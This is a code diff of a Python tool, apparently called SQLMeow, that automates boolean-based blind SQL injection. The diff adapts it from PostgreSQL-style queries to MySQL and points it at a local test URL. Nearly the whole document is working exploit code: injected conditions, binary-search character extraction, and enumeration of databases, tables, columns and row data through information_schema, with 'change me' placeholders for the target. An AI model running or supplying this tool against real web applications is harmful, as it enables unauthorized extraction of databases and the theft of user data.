@@ -3,29 +3,10 @@ from multiprocessing import Pool
 from itertools import repeat
 
 def boolean_based_blind(condition):
-    # Change this function
-    # print(condition)
-    cookies = {
-        'change me': f'a\' or {condition} -- -',
-    }
-
-    headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
-        'Accept-Language': 'zh-TW,zh-HK;q=0.8,zh-CN;q=0.7,zh-SG;q=0.5,en-US;q=0.3,en;q=0.2',
-        'Accept-Encoding': 'gzip, deflate, br',
-        'Connection': 'keep-alive',
-        'Upgrade-Insecure-Requests': '1',
-        'Sec-Fetch-Dest': 'document',
-        'Sec-Fetch-Mode': 'navigate',
-        'Sec-Fetch-Site': 'none',
-        'Sec-Fetch-User': '?1',
-        'Cache-Control': 'max-age=0',
-    }
-
-    response = requests.get('https://change_me_meow_meow/', headers=headers, cookies=cookies)
-    if "Change me meow meow" in response.text: 
-        # Change the condition
+    url = 'http://127.0.0.1:8788/?query=' # change me
+    query = f"SELECT * FROM information_schema.schemata where schema_name='test_db' or {condition}" # change me
+    response = requests.get(url+query) # maybe change me
+    if len(response.text) > 3000: # change me to other keyword or length
         return True
     else:
         return False
@@ -62,7 +43,7 @@ def do_binary_search(right_condition,guess_range,v=0):
         if boolean_based_blind(f"({i}={right_condition})"):
             if v == 1:
                 print("\t\t\t\t\t\t",end='\r')
-                print("Answer :",i , f"({chr(i)})")
+                print("Answer :",i , f"({chr(i) if i >= 32 and i <= 127 else ''})")
             return i
 
 
@@ -73,12 +54,12 @@ def do_binary_search(right_condition,guess_range,v=0):
 ################### Current DB
 def get_current_db(v):
     print("[🐱] Query Table Strings Length")
-    current_len_right = "(SELECT LENGTH(current_schema))" # MySQL : database() 
+    current_len_right = "(SELECT LENGTH(database()))" 
     guess_range = [1,100]
     current_db_len = do_binary_search(current_len_right,guess_range,v)
     print("[😺😺]Current DB Length:", current_db_len)
 
-    db_name_right_condition = "(SELECT ASCII(SUBSTRING(current_schema,{current_db_len},1)))"
+    db_name_right_condition = "(SELECT ASCII(SUBSTRING(database(),{current_db_len},1)))"
     db_name_right_conditions = [db_name_right_condition.format(current_db_len=i) for i in range(1,current_db_len+1)]
     guess_range = [32,128]
     param = zip(db_name_right_conditions,repeat(guess_range),repeat(v))
@@ -133,8 +114,8 @@ def get_tables(v):
     print("Tables Size:" , table_size)
 
     print("[🐱] Query Table Strings Length")
-    table_str_len_right = "(SELECT LENGTH(table_name) FROM information_schema.tables LIMIT 1 OFFSET {db_num})"
-    table_str_len_rights = [table_str_len_right.format(db_num=i) for i in range(table_size)]
+    table_str_len_right = "(SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema='{db}' LIMIT 1 OFFSET {db_num})"
+    table_str_len_rights = [table_str_len_right.format(db=db,db_num=i) for i in range(table_size)]
     guess_range = [1,100]
     param = zip(table_str_len_rights,repeat(guess_range),repeat(v))
     table_str_lens = pool.starmap(do_binary_search, param)
@@ -143,8 +124,8 @@ def get_tables(v):
     print("[🐱] Query Table Name")
     table_names = []
     for size in range(table_size):
-        table_name_right_condition = "(SELECT ASCII(SUBSTRING(table_name,{table_name_index},1)) FROM information_schema.tables LIMIT 1 OFFSET {size})"
-        table_name_right_conditions = [table_name_right_condition.format(table_name_index=i,size=size) for i in range(1,table_str_lens[size]+1)]
+        table_name_right_condition = "(SELECT ASCII(SUBSTRING(table_name,{table_name_index},1)) FROM information_schema.tables WHERE table_schema='{db}' LIMIT 1 OFFSET {size})"
+        table_name_right_conditions = [table_name_right_condition.format(table_name_index=i,db=db,size=size) for i in range(1,table_str_lens[size]+1)]
         guess_range = [32,128]
         param = zip(table_name_right_conditions,repeat(guess_range),repeat(v))
         table_name = pool.starmap(do_binary_search, param)
@@ -161,15 +142,15 @@ def get_columns(v):
     db = input("Database Name : ")
     table = input("Table Name : ")
     print("[🐱] Query Column Size")
-    column_size_right = f"(SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name='{table}' and table_schema='{db}')"
+    column_size_right = f"(SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name='{table}' AND table_schema='{db}')"
     guess_range = [1,200]
     column_size = do_binary_search(column_size_right,guess_range,v)
     print("[😺😺]Column Size:" , column_size)
 
 
     print("[🐱] Query Table Column Length")
-    column_str_len_right = "(SELECT LENGTH(column_name) FROM information_schema.columns LIMIT 1 OFFSET {db_num})"
-    column_str_len_rights = [column_str_len_right.format(db_num=i) for i in range(column_size)]
+    column_str_len_right = "(SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_name='{table}' AND table_schema='{db}' LIMIT 1 OFFSET {db_num})"
+    column_str_len_rights = [column_str_len_right.format(table=table,db=db,db_num=i) for i in range(column_size)]
     guess_range = [1,100]
     param = zip(column_str_len_rights,repeat(guess_range),repeat(v))
     column_str_lens = pool.starmap(do_binary_search, param)
@@ -178,8 +159,8 @@ def get_columns(v):
     print("[🐱] Query Column Name")
     column_names = []
     for size in range(column_size):
-        column_name_right_condition = "(SELECT ASCII(SUBSTRING(column_name,{column_name_index},1)) FROM information_schema.columns LIMIT 1 OFFSET {size})"
-        column_name_right_conditions = [column_name_right_condition.format(column_name_index=i,size=size) for i in range(1,column_str_lens[size]+1)]
+        column_name_right_condition = "(SELECT ASCII(SUBSTRING(column_name,{column_name_index},1)) FROM information_schema.columns WHERE table_name='{table}' AND table_schema='{db}'LIMIT 1 OFFSET {size})"
+        column_name_right_conditions = [column_name_right_condition.format(table=table,db=db,column_name_index=i,size=size) for i in range(1,column_str_lens[size]+1)]
         guess_range = [32,128]
         param = zip(column_name_right_conditions,repeat(guess_range),repeat(v))
         column_name = pool.starmap(do_binary_search, param)
@@ -194,7 +175,7 @@ def get_columns(v):
 def get_data(v):
     db = input("Database Name : ")
     table = input("Table Name : ")
-    column = input("Column Name (support '||' or 'concat'): ")
+    column = input("Column Name (support 'concat'): ")
 
     print("[🐱] Query Data Size")
     data_size_right = f"(SELECT COUNT({column}) FROM {db}.{table})"
@@ -228,7 +209,7 @@ def get_data(v):
 banner = """
 ▒█▀▀▀█ ▒█▀▀█ ▒█░░░ ▒█▀▄▀█ ▒█▀▀▀ █▀▀█ █░░░█
 ░▀▀▀▄▄ ▒█░▒█ ▒█░░░ ▒█▒█▒█ ▒█▀▀▀ █▄▀█ █▄█▄█
-▒█▄▄▄█ ░▀▀█▄ ▒█▄▄█ ▒█░░▒█ ▒█▄▄▄ █▄▄█ ░▀░▀░
+▒█▄▄▄█ ░▀▀█▄ ▒█▄▄█ ▒█░░▒█ ▒█▄▄▄ █▄▄█ ░▀░▀░ for MySQL
 """
 print(banner)
 
